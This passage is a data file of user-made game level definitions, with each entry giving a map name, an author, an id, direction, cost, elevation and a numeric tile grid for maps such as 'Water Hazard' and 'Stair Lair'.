,13,13,13,76,13,76,13,76,13,13,13,13,13,1,0,0,13,13,13,98,98,98,19,0,0,0,0,0,0,0,13,13,13,13,1,0,13,13,13,13,13,13,19,0,0,0,0,0,0,0,0,13,13,13,0,2,13,13,13,13,13,13,19,0,0,0,0,0,0,0,0,0,13,13,0,2,13,13,13,13,13,13,19,0,0,0,0,0,0,0,0,0,13,13,0,0,13,13,13,13,13,13,98,34,0,0,0,35,0,0,33,0,13,13,0,0,13,13,13,13,13,13,98,99,0,36,0,0,0,0,0,0,13,13,0,0,13,13,13,13,13,13,98,34,0,0,0,0,34,0,0,0,13,13,0]});
maps.push({name="The Great Wall",author="tilgep",id="#1651340418",direction="forward",cost=289,elevation=-2,map=[0,0,0,0,0,0,7,7,7,2,2,7,7,7,0,0,0,0,0,0,0,0,0,0,5,6,7,7,7,7,7,7,7,7,6,5,0,0,0,0,0,0,0,5,5,6,6,6,6,6,6,6,6,6,6,5,5,0,0,0,0,0,0,5,5,5,5,5,5,0,0,5,5,5,5,5,90,0,0,0,0,0,5,5,90,5,5,5,0,0,0,0,5,5,90,5,5,5,0,0,77,96,90,5,5,90,5,0,0,77,77,0,0,5,5,90,5,5,98,77,24,105,1,92,1,5,0,1,0,24,24,0,1,0,5,1,92,1,105,24,1,3,1,124,1,1,1,1,1,1,1,1,1,1,1,1,124,1,3,1,1,124,1,97,124,0,124,0,123,123,124,1,124,124,0,124,99,1,124,1,1,124,124,124,124,124,0,124,1,122,123,123,0,124,124,124,124,124,124,1,1,1,1,124,124,1,1,1,1,124,124,1,1,1,1,124,124,1,1,1,0,1,0,1,1,0,0,1,1,24,24,1,0,1,0,1,1,0,0,1,0,0,0,0,0,0,0,24,1,65,65,1,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,77,1,65,65,1,77,0,0,0,0,0,0,0,0,0,0,0,0,0,0,77,5,65,65,5,77,0,0,0,0,0,0,0,0,0,0,0,0,0,0,77,5,65,65,5,77,0,0,0,0,0,0,0,0,0,0,0,0,0,0,77,5,5,5,5,77,0,0,0,0,0,0,0,0,0,0,0,0,0,0,77,5,5,5,5,77,0,0,0,0,0,0,0,0,0,0,0,0,0,0,77,5,5,5,5,77,0,0,0,0,0,0,0,0,0,0,0,0,0,0,77,5,2,2,5,77,0,0,0,0,0,0,0]});
maps.push({name="A Hazardous Crossing",author="tilgep",id="#1651340817",direction="right",cost=323,elevation=-6,map=[0,0,0,0,20,2,2,20,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,20,20,20,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,20,90,20,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,20,20,20,20,0,0,77,0,0,0,77,0,0,0,0,0,0,0,20,20,20,20,64,0,0,77,24,77,0,77,24,77,0,0,0,0,0,0,20,20,20,20,0,0,0,0,77,0,0,0,77,0,0,0,0,0,0,0,20,90,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,20,20,90,0,77,77,77,77,77,77,0,0,0,0,0,0,0,0,0,20,20,20,20,20,83,76,83,76,76,76,20,19,18,17,16,15,14,14,14,0,20,90,20,20,83,76,83,76,76,76,20,19,90,90,16,15,14,14,2,0,0,20,20,20,83,76,83,76,83,83,20,64,18,17,16,15,14,14,2,0,0,0,20,20,83,76,83,76,83,83,20,19,18,17,16,15,14,14,14,0,0,0,96,0,77,76,83,76,77,77,0,0,97,0,0,0,0,0,0,0,0,0,40,96,0,76,83,76,0,0,39,0,0,0,0,77,35,77,0,0,0,0,41,0,0,76,76,76,0,0,0,0,0,0,0,0,36,0,0,0,96,0,0,0,0,76,76,76,0,39,0,0,77,77,0,0,37,0,0,0,40,96,0,41,0,76,76,76,0,0,0,0,24,24,0,0,38,0,0,0,41,40,96,0,0,40,40,40,0,0,0,0,77,77,0,0,39,0,0,0,41,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,40,0,0,0,41,92,0,0,0,0,0,0,0,0,0,0,0,0,0,0,41,0,0]});
maps.push({name="Water Slaughter",author="Midran Kidran",id="#1651343741",direction="forward",cost=496,elevation=7,map=[5,5,5,5,66,5,66,66,5,2,2,5,66,66,5,66,5,5,5,5,5,1,5,66,66,66,66,66,5,5,5,5,66,66,66,66,66,5,1,5,5,1,5,66,66,66,66,66,66,66,66,66,66,66,66,66,66,5,1,5,5,1,5,66,66,5,66,66,66,66,66,66,66,66,5,66,66,5,1,5,5,1,5,5,66,66,66,66,5,66,66,5,66,66,66,66,5,5,1,5,97,1,5,5,66,66,66,66,66,66,66,66,66,66,66,66,5,5,1,97,1,1,5,5,5,5,5,5,66,66,66,66,5,5,5,5,5,5,1,1,1,1,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,1,1,1,1,1,1,5,5,5,5,5,5,5,5,5,5,5,5,1,1,1,1,5,5,5,1,1,1,1,1,1,96,96,1,1,1,1,1,1,5,5,5,6,1,5,5,5,5,5,5,95,95,95,95,5,5,5,5,5,5,1,6,7,1,1,1,1,1,5,5,5,5,5,5,5,5,1,1,1,1,1,7,8,1,12,12,12,1,1,1,1,1,1,1,1,1,1,12,12,12,1,8,9,1,12,1,12,12,12,12,12,12,12,12,12,12,12,12,1,12,1,9,10,1,12,1,1,1,1,1,1,95,95,1,1,1,1,1,1,12,1,10,11,1,12,1,12,12,12,12,12,12,12,12,12,12,12,12,1,12,1,11,12,1,12,1,12,15,15,15,15,15,15,15,15,15,15,12,1,12,1,12,12,12,12,1,12,12,12,12,12,12,12,12,12,12,12,12,1,12,12,12,1,1,1,1,12,12,12,12,1,98,98,1,12,12,12,12,1,1,1,1,1,99,12,12,12,1,1,1,98,2,2,98,1,1,1,12,12,12,99,1]});
maps.push({name="Manic Panic",author="Midran Kidran",id="#1651345495",direction="forward",cost=433,elevation=0,map=[5,5,5,5,5,5,5,5,5,2,2,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,24,5,9,6,6,6,6,6,6,6,6,9,5,24,5,5,5,5,5,5,24,5,10,7,7,7,7,7,7,7,7,10,5,24,5,5,5,5,5,5,24,5,11,8,8,8,8,8,8,8,8,11,5,24,5,5,5,5,5,5,24,5,12,9,9,9,9,9,9,9,9,12,5,24,5,5,5,3,3,5,24,5,13,10,10,10,10,10,10,10,10,13,5,24,5,3,3,11,11,11,24,5,14,11,11,11,11,11,11,11,11,14,5,24,11,11,11,66,66,66,5,5,97,66,66,66,66,66,66,66,66,97,5,5,66,66,66,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,97,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,97,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,1,1,1,1,1,1,1,1,1,96,96,1,1,1,1,1,1,1,1,1,1,5,5,5,5,5,5,5,1,5,5,5,5,5,5,5,5,5,5,1,1,1,1,1,1,1,1,5,1,1,1,1,1,1,1,1,1,1,5,1,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,1,1,1,1,1,1,1,1,1,1,1,1,1,5,90,5,5,5,90,5,1,5,5,5,95,5,1,5,5,5,5,5,1,5,5,5,90,5,5,5,1,5,5,5,1,5,95,5,5,1,5,5,5,5,5,5,5,5,5,5,1,2,2,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1]});
maps.push({name="Stair Lair",author="Midran Kidran",id="#1651346708",direction="forward",cost=414,elevation=19,map=[5,5,5,5,5,5,5,5,5,5,5,5,2,2,5,5,5,5,5,1,1,1,1,1,1,1,1,1,1,1,5,5,5,5,5,5,5,1,5,1,1,15,15,96,15,15,15,14,14,1,5,5,5,5,5,5,5,1,95,1,1,15,15,96,15,15,15,14,14,1,5,5,5,5,5,5,5,1,5,1,1,16,16,1,15,1,1,13,13,1,5,5,5,5,5,5,5,1,5,5,1,16,16,1,5,5,1,13,13,1,1,1,1,1,5,5,5,1,6,6,1,17,1,1,5,5,1,12,12,1,24,24,24,1,5,5,5,1,6,6,1,17,1,5,15,5,1,12,12,1,24,99,24,1,5,5,5,1,6,6,1,18,1,15,15,5,1,11,11,1,24,24,24,1,5,5,5,1,7,7,1,18,1,97,15,5,1,11,11,1,1,24,1,1,1,1,1,1,7,7,1,19,1,15,15,5,1,10,10,9,9,8,8,8,8,8,7,7,7,7,1,19,1,5,5,5,1,10,10,9,9,8,8,8,8,8,7,7,7,7,1,20,1,5,5,5,1,1,1,1,1,24,1,1,1,1,1,1,1,1,1,20,1,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,1,20,1,1,5,5,5,1,1,5,5,5,1,1,1,1,5,5,5,5,1,20,21,21,22,1,22,23,23,23,1,24,24,98,24,24,5,24,5,5,1,20,21,21,22,22,22,23,1,23,24,24,24,98,24,24,5,5,5,24,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,5,24,24,24,24,24,95,24,24,24,24,24,24,24,24,24,24,24,24,5,24,24,24,2,2,24,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1]});
maps.push({name="Hanging About",author="tilgep",id="#1651408037",direction="right",cost=210,elevation=-1,map=[0,0,0,0,27,2,2,27,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,27,27,27,27,0,0,0,0,0,96,0,0,28,0,0,0,0,0,0,0,27,27,27,27,27,0,0,0,0,28,96,28,28,28,28,0,0,0,0,0,0,27,27,27,27,27,27,28,28,28,96,28,28,28,28,0,0,0,0,0,0,27,27,27,27,27,27,28,28,28,96,28,28,28,28,29,0,0,0,0,0,27,27,27,27,27,27,28,28,28,96,28,28,28,29,29,0,0,0,0,0,27,27,27,27,27,27,28,28,28,96,28,28,28,29,29,0,0,0,0,0,0,28,0,0,0,0,0,28,28,96,28,28,28,29,29,0,0,0,0,0,0,29,0,28,0,0,0,0,96,0,0,29,29,29,29,0,1,3,0,0,29,29,0,0,0,0,0,0,0,0,0,29,29,29,29,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,29,29,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,98,29,29,29,98,0,1,0,3,0,0,0,0,0,0,0,0,0,0,0,0,98,98,98,0,0,1,0,0,0,0,0,0,0,3,0,0,0,0,0,0,27,27,27,0,0,1,0,0,3,0,0,0,0,0,0,0,0,0,0,0,27,27,27,0,0,1,0,0,0,1,0,0,0,0,0,0,3,0,0,0,27,27,26,26,0,1,3,0,0,1,0,3,0,0,0,0,0,0,0,0,27,27,26,2,0,0,0,0,0,1,0,0,0,0,0,0,0,0,44,44,27,27,26,2,0,0,0,0,38,96,0,0,0,0,0,0,3,44,99,44,3,27,26,26,0,97,39,0,1,1,37,0,0,0,0,0,0,0,44,44,27,27,0,0]});
maps.push({name="Water surf",author="Luffaren",id="#1651490449",direction="right",cost=436,elevation=5,map=[9,9,2,2,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,9,9,0,93,24,0,0,0,0,0,0,0,0,0,0,0,0,127,127,127,127,9,0,94,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,0,0,96,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,67,0,96,0,0,67,0,0,0,0,0,0,0,0,0,67,67,67,67,11,12,13,96,0,9,9,0,0,0,0,0,0,0,0,24,14,14,14,14,24,24,24,24,96,0,9,67,0,0,0,0,0,0,0,24,66,66,66,66,24,100,89,24,96,0,9,9,9,0,0,0,0,0,0,1,66,66,66,66,24,24,24,24,96,44,44,43,9,0,0,0,0,0,0,1,66,66,66,66,1,1,1,1,1,95,1,42,9,0,0,0,0,0,0,24,66,66,66,66,1,124,85,0,67,124,1,41,9,0,0,0,0,0,0,100,24,66,66,66,67,92,97,0,0,85,1,40,9,0,67,67,67,67,0,24,14,66,66,66,1,85,124,67,0,124,1,39,9,9,9,9,9,9,9,1,72,66,66,66,1,1,1,1,1,1,1,38,9,17,9,16,9,3,92,1,72,66,66,66,24,24,24,24,24,24,24,24,24,24,24,14,14,14,14,24,72,66,66,66,66,66,66,66,66,66,66,66,66,66,66,14,85,14,85,24,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,14,14,14,2,24,66,66,66,66,66,66,66,66,66,66,66,66,66,66,66,14,85,14,2,24,74,74,74,74,74,66,66,66,66,66,66,66,66,66,66,14,14,14,14,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,14,14,14,85]});
maps.push({name="Gato fertlilzing",author="Kitty Cat",id="#1651492613",direction="forward",cost=249,elevation=0,map=[0,1,1,1,1,1,1,1,2,2,1,1,1,1,1,1,0,0,0,0,0,5,5,5,1,5,5,5,5,5,5,5,1,5,5,5,0,0,0,0,0,5,5,5,1,5,5,5,5,5,5,5,1,5,5,5,0,0,0,0,0,5,5,5,1,5,5,5,5,5,5,5,1,5,5,5,0,0,0,0,0,5,5,5,1,5,5,5,5,5,5,5,1,5,5,5,0,0,0,0,0,5,5,5,1,97,5,5,5,5,5,5,1,5,5,5,6,0,0,0,0,5,5,5,1,1,1,1,96,1,1,1,1,5,5,6,6,6,0,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,6,6,6,0,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,6,6,6,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,0,6,86,0,0,0,5,5,5,5,5,5,5,5,5,1,1,0,0,0,0,0,93,0,0,0,5,5,5,5,5,5,5,5,5,25,25,25,0,25,25,25,25,0,0,0,0,0,5,5,5,5,5,5,0,0,25,0,25,0,25,25,25,0,0,0,0,0,0,5,5,45,45,0,0,0,0,0,0,0,0,0,25,0,0,0,0,0,5,5,0,45,45,0,0,0,0,0,0,0,0,0,25,0,0,0,0,5,5,0,0,45,45,0,0,0,0,0,0,0,0,0,25,0,0,0,5,5,0,0,0,45,45,0,0,0,0,0,0,0,0,0,25,0,0,5,5,0,0,0,0,45,45,0,45,45,45,45,0,45,45,45,45,0,5,5,0,25,0,25,0,45,45,0,45,45,45,45,0,45,45,45,45,100,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0]});
maps.push({name="zeramp",author="Kitty Cat",id="#1651495591",direction="left",cost=151,elevation=16,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,13,13,13,12,12,11,11,10,10,9,9,8,8,7,7,6,6,5,5,0,13,13,13,12,12,11,11,10,10,9,9,8,8,7,7,6,6,5,5,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,6,6,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,6,6,0,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,7,0,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,7,0,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,8,0,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,8,0,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,0,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,0,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,99,20,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,0,96,96,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,1,20,20,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,2,21,21,20,98,20,19,19,18,18,17,17,16,16,15,15,14,14,13,13,2,21,21,20,98,20,19,19,18,18,17,17,16,16,15,15,14,14,13,13,0,0,0,1,0,97,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Booster go weee",author="Kitty Cat",id="#1651498539",direction="left",cost=105,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,1,66,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,66,69,68,66,5,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,66,69,69,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,66,66,66,5,1,2,5,5,5,5,5,5,0,0,0,0,0,0,128,5,5,5,5,5,5,2,5,5,5,5,5,5,0,0,0,0,0,0,128,5,5,5,5,5,5,0,0,0,5,127,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,126,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,100,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Trust the booster",author="Kitty Cat",id="#1651499619",direction="right",cost=44,elevation=14,map=[2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,127,127,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,129,0,0,0,0,14,14,129,0,0,0,0,19,19,19,19,19,2,9,9,129,0,0,0,0,14,14,129,0,0,0,0,19,19,19,19,19,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Leaps of faith",author="Kitty Cat",id="#1651501176",direction="right",cost=120,elevation=0,map=[2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,34,34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,34,34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,34,34,0,0,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,0,0,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,34,34,0,0,0,0,0,0,0,0,36,36,0,0,0,0,0,0,0,0,34,34,0,0,0,0,0,0,0,0,36,36,0,0,0,0,0,0,34,34,0,0,0,0,0,0,0,0,0,36,36,36,36,0,0,0,0,0,34,34,34,34,0,0,0,0,0,0,0,36,36,36,36,0,0,0,0,0,34,34,34,34,0,0,0,0,0,0,0,36,36,93,36,0,0,0,0,0,34,34,0,0,0,0,0,0,0,0,0,36,36,36,36,0,0,0,0,0,34,34,34,34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,34,34,34,34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,34,34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,34,34,34,34,0,34,34,0,34,34,0,34,34,0,34,34,0,34,34,34,34,2,34,34,0,34,34,0,34,34,0,34,34,0,34,34,0,34,34,34,34,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Mess",author="Mooyoung",id="#1651507767",direction="forward",cost=217,elevation=16,map=[0,0,34,0,34,0,0,34,1,2,2,0,0,0,0,0,0,0,0,0,0,34,1,1,1,1,1,0,1,5,5,0,0,0,0,0,0,0,0,0,0,1,1,14,4,24,99,0,1,5,5,0,0,0,0,0,0,0,0,0,34,0,34,0,0,44,1,34,1,5,5,0,0,0,0,0,0,0,0,0,1,1,0,0,41,1,0,0,1,5,5,0,0,0,0,0,0,0,0,0,0,0,37,1,1,1,0,34,1,5,5,0,0,0,0,0,0,0,0,0,0,34,1,1,0,34,0,0,1,95,95,0,0,0,0,0,0,0,0,0,34,1,1,34,0,0,0,1,1,5,5,0,0,0,0,0,0,0,0,0,0,34,0,0,0,0,0,1,11,3,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,11,11,11,11,0,0,0,0,0,0,0,0,13,13,13,12,11,96,10,10,11,11,11,11,11,12,13,14,92,0,0,14,13,13,13,12,11,96,10,10,11,11,11,11,11,12,13,14,92,0,0,14,0,0,0,0,0,0,0,0,11,11,11,11,1,1,1,1,1,0,0,0,13,13,0,0,0,0,0,0,1,1,1,1,1,0,0,0,0,0,35,1,13,13,0,0,0,0,0,0,1,0,0,35,0,0,0,0,0,0,0,1,98,98,0,0,0,0,0,0,1,0,0,0,0,35,0,35,0,35,0,1,13,13,0,0,0,0,0,0,1,35,0,0,0,0,0,0,0,0,1,1,3,21,0,0,0,0,0,1,0,0,0,0,1,1,1,1,1,1,1,1,21,21,21,20,19,18,17,98,15,0,0,0,1,1,1,1,1,1,1,1,2,2,21,20,19,18,17,98,15,0,35,0,35,0,35,0,35,15,97,1]});
maps.push({name="Spread",author="tilgep",id="#1651590944",direction="forward",cost=263,elevation=-1,map=[122,122,122,0,0,0,0,0,0,0,123,2,2,123,0,0,0,0,0,0,122,102,122,0,0,0,0,0,0,0,123,123,123,123,0,0,0,0,0,0,122,122,122,0,0,0,0,0,0,0,123,123,123,123,0,0,0,0,0,0,122,122,122,0,0,0,0,0,0,0,123,123,123,123,0,0,0,0,0,0,1,122,1,0,0,0,0,0,0,0,123,123,123,123,0,0,0,0,123,99,1,98,1,0,0,0,0,0,0,0,123,123,123,123,0,0,0,0,123,123,1,122,1,0,0,0,0,0,0,0,123,105,123,123,0,0,0,1,123,123,122,122,122,0,0,0,0,0,0,1,123,123,123,123,1,0,0,1,123,123,122,122,122,0,0,1,0,0,1,1,123,123,123,123,1,1,0,1,123,123,121,121,121,121,121,105,121,121,122,122,122,122,122,122,122,122,123,105,123,123,121,121,121,121,121,95,121,121,122,122,122,122,122,122,122,122,123,96,123,123,121,121,121,121,121,95,121,121,122,122,122,122,107,122,122,122,123,96,123,123,121,121,121,121,121,105,121,121,122,122,122,122,122,122,122,122,123,105,123,123,120,120,120,0,0,1,0,0,1,1,122,122,122,122,1,1,0,1,0,0,120,120,120,0,0,0,0,0,0,1,122,122,122,122,1,0,0,0,0,0,120,120,120,0,0,0,0,0,0,0,122,122,122,122,0,0,0,0,0,0,120,97,120,0,0,0,0,0,1,1,105,101,101,105,1,0,0,0,0,0,120,120,120,120,1,1,1,121,121,121,122,122,122,122,0,0,0,0,0,0,120,120,120,120,120,101,120,121,121,121,122,122,122,122,0,0,0,0,0,0,120,120,120,120,1,1,1,121,121,121,122,2,2,122,0,0,0,0,0,0]});
maps.push({name="Pools",author="tilgep",id="#1651606730",direction="forward",cost=421,elevation=-2,map=[0,14,14,0,0,0,12,12,12,2,2,12,12,12,0,10,10,10,0,0,0,14,13,0,0,0,12,12,12,12,12,12,12,0,10,10,10,10,10,0,0,14,12,0,0,0,12,12,12,12,12,12,0,10,10,66,66,66,66,67,0,14,11,0,10,11,11,11,11,11,11,11,10,10,10,66,66,66,66,67,0,14,10,10,10,11,11,11,11,11,11,11,10,10,66,66,66,66,66,67,0,14,10,10,10,11,11,11,11,11,11,11,10,10,66,66,66,66,10,0,0,14,10,10,10,11,11,11,11,11,11,11,10,65,66,66,66,10,10,0,0,15,15,15,10,10,10,10,10,10,10,10,10,10,68,10,10,10,10,0,0,15,15,15,38,10,37,10,10,10,10,10,10,10,68,10,10,10,0,0,0,0,92,0,10,10,10,10,10,10,10,10,10,10,68,10,10,0,0,0,0,10,0,10,39,10,36,10,10,10,10,10,10,10,68,10,0,0,0,0,10,10,10,10,10,10,10,10,10,65,65,65,65,10,68,10,0,0,0,0,10,10,10,10,15,15,65,65,65,65,66,66,66,66,66,10,0,0,0,0,10,10,10,10,19,65,66,66,66,66,66,66,66,66,66,74,67,0,0,0,0,10,10,10,10,66,66,66,66,66,66,66,66,66,66,74,67,0,0,0,100,40,10,10,20,66,66,66,66,66,66,66,24,66,66,74,67,0,0,0,0,10,10,10,10,66,66,66,66,66,66,66,72,72,10,10,0,0,0,0,0,0,0,67,73,66,66,66,66,10,10,10,67,67,0,0,0,0,0,0,0,9,15,15,10,10,10,10,10,10,10,0,0,0,0,0,0,0,0,0,9,3,15,14,13,10,10,2,2,10,10,0,0,0,0,0,0,0,0,0]});
maps.push({name="Gap",author="tilgep",id="#1651607907",direction="forward",cost=360,elevation=-2,map=[108,108,108,108,1,1,1,1,2,2,1,1,1,1,108,108,108,108,108,108,108,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,108,108,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,108,108,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,108,108,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,108,1,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,1,1,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,1,1,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,1,106,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,106,106,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,106,106,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,106,106,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,106,106,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,106,106,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,106,106,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,106,106,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,106,106,106,106,106,106,106,106,106,106,2,2,106,106,106,106,106,106,106,106,106]});
maps.push({name="Water Hazard",author="tilgep",id="#1651679489",direction="right",cost=508,elevation=-1,map=[0,0,0,0,0,19,19,19,2,2,19,19,0,19,19,19,0,0,0,0,0,0,0,0,19,19,19,19,19,19,19,19,19,19,19,19,0,0,0,0,0,0,0,19,19,19,19,90,19,19,19,19,19,90,19,19,19,19,0,0,0,0,0,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,0,0,0,19,19,19,19,19,19,19,127,19,19,65,65,65,65,65,66,74,67,0,0,19,19,19,65,65,65,65,65,65,65,65,65,65,66,66,66,74,67,0,19,19,19,65,66,66,66,66,66,66,66,66,66,66,66,66,66,74,67,0,19,19,65,66,66,66,66,66,66,66,66,66,66,66,66,68,66,74,67,0,19,19,65,66,68,68,68,68,68,68,68,68,68,68,68,68,68,74,67,0,19,19,65,66,68,68,68,68,68,68,68,68,68,68,68,68,68,68,67,0,19,19,66,68,68,69,69,68,22,22,22,22,69,68,68,68,68,68,67,0,0,19,66,68,69,69,68,68,22,22,22,22,69,68,68,69,68,68,67,0,0,19,19,66,66,68,68,68,68,68,68,68,68,68,68,68,68,66,67,0,0,0,19,19,66,66,66,68,68,68,69,69,68,68,66,66,66,19,25,0,0,0,0,19,19,74,74,66,66,66,66,66,66,66,66,19,19,92,25,0,0,0,0,0,19,19,65,65,65,65,65,65,65,19,19,19,19,19,19,0,0,0,0,0,0,19,19,19,19,19,19,19,19,19,19,19,19,18,18,0,0,0,0,0,0,0,0,19,19,19,19,90,19,19,19,19,19,18,2,0,0,0,0,0,0,0,0,0,0,19,19,19,19,19,90,19,19,18,2,0,0,0,0,0,0,0,0,0,0,0,0,19,19,19,19,19,19,18,18]});
